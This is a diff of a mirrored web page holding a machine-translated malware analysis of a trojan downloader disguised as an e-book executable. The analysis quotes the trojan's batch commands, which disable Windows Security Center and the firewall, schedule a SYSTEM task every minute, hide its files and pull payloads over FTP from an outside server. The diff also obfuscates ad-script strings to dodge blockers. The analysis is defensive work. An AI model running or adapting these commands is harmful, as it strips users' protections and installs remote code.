@@ -24,12 +24,12 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>
 
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
   <script>
-       (adsbygoogle = window.adsbygoogle || []).push({
-            google_ad_client: "ca-pub-6974184241884155",
-            enable_page_level_ads: true
-       });
+        var superSpecialObject = {};
+        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
+        superSpecialObject['enable_page_level_a' + 'ds'] = true;
+       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
   </script>
 </head>
 
@@ -51,7 +51,7 @@
   <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
   <section class="page js-page"><h1>Analysis of the next version of the hidden radmin</h1><div class="post__text post__text-html js-mediator-article">  Today on the forum in a personal message passed asking to check the file.  I agreed, curious.  A little ahead of the events and I will say that this is a backdoor created from the second-line radmin and something else) <br>  The resulting file: <b>kak_ponyat_muzhchin_bibl.ru.exe (md5: 2138A224BDDD1A36329F398A37E10AB9)</b> <br>  <i>Hash amounts I will only specify for malicious files.</i> <br>  In general, the description - this is some kind of book, why in exe - it is not clear, we look further. <br>  Use PEiD: <br><img src="http://i25.fastpic.ru/big/2011/0708/54/ce2bdc25690524829972504177ebf554.jpeg"><br>  <em>UPX 0.89.6 - 1.02 / 1.05 - 2.90 (Delphi) stub -&gt; Markus &amp; Laszlo [RAR SFX]</em> <br>  Let's try to unpack winrar, get two files: <br><a name="habracut"></a><br>  <strong>filip_olegovich.exe</strong> <br>  and <strong>setup.exe (md5: C888FCE716D600EE53D467F7DF2B2475)</strong> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ff3/218/cb0/ff3218cb0d1c895dab36730c7e338b19.jpg"><br><br>  Both are packed in upx, after unpacking we get the following picture: 
       <br>
-        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+        <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"></script>')</script>
         <ins class="adsbygoogle"
           style="display:block; text-align:center;"
           data-ad-layout="in-article"
@@ -59,7 +59,7 @@
           data-ad-client="ca-pub-6974184241884155"
           data-ad-slot="8945601208"></ins>
         <script>
-          (adsbygoogle = window.adsbygoogle || []).push({});
+          (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push({});
         </script>
       <br>
     <img src="http://i25.fastpic.ru/big/2011/0708/c0/2405b38c08764eb27043e2a30a348fc0.jpeg"><br><br>  <strong>filip_olegovich.exe</strong> is a pdf file compiled into an exe, it no longer interests us. <br>  <strong>setup.exe (md5: 732FCAA243C007DAA9354AEAF3F6D572)</strong> - compiler <strong>PureBasic 4.x -&gt; Neil Hodgson *</strong> , which is typical for the converter of bat-files to executable exe. <br><br>  While both variants of the suspicious file are being loaded onto the virus-desktop, let's see the resources of the unpacked <strong>setup.exe</strong> : <br><br><img src="http://i25.fastpic.ru/big/2011/0708/eb/110a4ee1b358a9452b81e802119ce1eb.jpeg"><br><br>  Yes, this is a converted batch file that will create 2 files and execute its own baht code: <br><blockquote>  sc config schedule start = auto <br>  sc start schedule <br><br>  sc config wscsvc start = disabled <br>  sc config SharedAccess start = disabled <br><br>  sc stop wscsvc <br>  sc stop SharedAccess <br><br>  schtasks / create / tn "f" / sc minute / mo 1 / ru "NT AUTHORITY \ SYSTEM" / tr% systemroot% / ff.bat <br><br>  attrib + h% systemroot% / tasks /*.* netsh advfirewall set currentprofile state off <br>  C: /isendsms_setup.exe </blockquote><br>  This batch file will start the task scheduler service, stop the "Security Center and Security Alerts" and "Windows Firewall" services. Then add the task to the scheduler, which will run the <strong>ff.bat</strong> file every minute, hide the task file and disable the firewall again.  The developer or paranoid or dilletant, rather - the second.  Simply put, this <strong>setup.exe</strong> file is an instance of a trojan loader (trojan-downloader), just somewhat improvised.  Next, consider the two above files: This text will be copied to <strong>% systemroot% / system.bin</strong> <br><blockquote>  u11631 <br>  javasc <br>  get f.bat <br>  del check.txt <br>  bye </blockquote><br>  And such code in% systemroot% / ff.bat <br><blockquote>  sc config wscsvc start = disabled <br>  sc config SharedAccess start = disabled <br>  sc stop wscsvc sc stop SharedAccess <br>  ftp -s: C: \ WINDOWS / system.bin ftp.on.ufanet.ru f.bat </blockquote><br>  <em>% systemroot% - windows folder, in my case C: \ windows</em> <br><br>  What can it tell us? <br>  First of all, the file <strong>system.bin</strong> is the config for the FTP client, which will go to the server and download a specific file.  (Lines in turn: login from server, password, download file from server, delete file on server, end ftp session) <br>  What does the <strong>ff.bat</strong> file <strong>do</strong> ?  First, it stops and removes two services from autoload: <strong>wscsvc</strong> - security and alert center <br>  <strong>SharedAccess</strong> - windows firewall This does not allow the built-in firewall to block further network activity, as well as blocking alerts about system security gaps. <br>  Next, it raises the connection to the <strong>ftp.on.ufanet.ru</strong> server with <strong>settings</strong> from the <strong>system.bin</strong> file.  After the session is completed, ftp will execute the <strong>f.ftp</strong> file, which will be downloaded from the specified server. <br>  Our <strong>setup.exe</strong> files, by the way, have already been analyzed on virustotal: <br><ul><li>  <a href="http://www.virustotal.com/file-scan/report.html%3Fid%3D8fec6bfee0fcbd2e32810dc905a30e2206da35cea08ffa478bcdd8d02e854112-1310126086">Packed</a> </li><li>  <a href="http://www.virustotal.com/file-scan/report.html%3Fid%3D0836ab93db5c278225a93d2108b8c7d2565cdd6a74ff311b823b8a77666174dc-1310126562">Unpacked</a> </li></ul><br>  Next, we need to get the files that should have been downloaded from the FTP, for this we take the login and password and connect ourselves: <br>  <strong>f.bat</strong> <br>  <strong>system.exe (md5: 1ADEF54E08294BC7548C91C8F6CF2032)</strong> - RAR SFX archive with this comment: <br><pre>  path =% SYSTEMROOT% / help / win32
@@ -79,7 +79,7 @@
  ExecuteWizard ('TSW', 2,3, true);
  BC_Activate;
  RebootWindows (true);
- end. </pre></div><p>Source: <a href="https://habr.com/ru/post/123752/">https://habr.com/ru/post/123752/</a></p>
+ end. </pre></div><p>Source: https://habr.com/ru/post/123752/</p>
 <section class="more-articles-navigation-panel js-more-articles-navigation-panel">
 <h4>More articles:</h4>
 <nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
@@ -91,8 +91,8 @@
 <li><a href="../123754/index.html">8.9 "SONY subnotebook with integrated video capture card (~ 2001 onwards)</a></li>
 <li><a href="../123755/index.html">In the search line of the Rambler, you can not only write - but also speak</a></li>
 <li><a href="../123757/index.html">DIV-based mailing lists: this is possible!</a></li>
+<li><a href="../12376/index.html">Doping polymers with nanoparticles increases the efficiency of OLED by 30%</a></li>
 <li><a href="../123760/index.html">Implementing AES on Wolfram Mathematica</a></li>
-<li><a href="../123767/index.html">Learn Haskel for good! Applicative Functors</a></li>
 </ul></nav>
 </section><br />
 <a href="../../allArticles.html"><strong>All Articles</strong></a>
